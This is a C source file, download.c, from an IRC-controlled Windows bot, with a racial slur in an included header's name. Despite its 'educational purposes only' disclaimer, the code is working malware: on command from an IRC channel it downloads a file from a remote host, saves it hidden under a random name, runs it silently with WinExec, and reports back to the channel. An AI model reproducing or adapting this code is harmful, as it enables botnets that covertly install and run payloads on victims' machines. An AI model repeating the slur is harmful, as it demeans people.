/*
 *      download.c 2007 Ravo_5002
 *      This code is for educational purposes only...
 */

#include <stdio.h>
#include <winsock.h>
#include <windows.h>

#include "download.h"
#include "niggerbot.h"
#include "config.h"


void download(SOCKET ircconn, char *url) {
	strtok(url, "//");
	char *srv = strtok(NULL, "/");
	char *path = strtok(NULL, " ");
	char *exeflag = strtok(NULL, "\n");
	
	struct hostent *hp;
	unsigned int addr;
	struct sockaddr_in server;
	SOCKET webconn;
	webconn = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if(webconn == INVALID_SOCKET) {
		return;
	}
	hp = gethostbyname(srv);

	server.sin_addr.s_addr=*((unsigned long*)hp->h_addr);
	server.sin_family=AF_INET;
	server.sin_port=htons(80);
	if(connect(webconn,(struct sockaddr*)&server,sizeof(server))) {
		return;
	}

	char buff[4096];
	sprintf(buff, "GET /%s HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\r\nHost: %s:80\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n", path, srv);
	send(webconn,buff, strlen(buff), 0);
	char location[20];
	sprintf(location, "C:\\%s.exe", randnick());
    FILE *file=fopen(location, "wb");
	char buf[1024];
	unsigned char bufm[4096];
	int i, d;
    while(1) {
		int i;
        if ((i = recv(webconn, bufm, 4096, 0)) <= 0) break;
        if (i < 4096) bufm[i]=0;
        for (d=0;d<i;d++) if (!strncmp(bufm+d, "\r\n\r\n", 4)) {
			for (d+=4;d<i;d++) {
				fputc(bufm[d],file);
			}
			while(1) {
				int i,d;
				if ((i=recv(webconn, bufm, 4096, 0)) <= 0) break;
				if (i < 4096) bufm[i]=0;
				for (d = 0; d < i; d++) {
					fputc(bufm[d], file);
				}
			}
			fclose(file);	
			closesocket(webconn);
			if(exeflag) {
				SetFileAttributes(location ,FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
				WinExec(location, 0);
				sprintf(buff, "PRIVMSG %s :Succesfully downloaded file to %s and executed...\n", CHANNEL, location);
				send(ircconn,buff, strlen(buff), 0);
				return;
			}
			SetFileAttributes(location ,FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
			sprintf(buff, "PRIVMSG %s :Succesfully downloaded file to %s...\n", CHANNEL, location);
			send(ircconn,buff, strlen(buff), 0);			
			return;
        }
    }
	return;
}
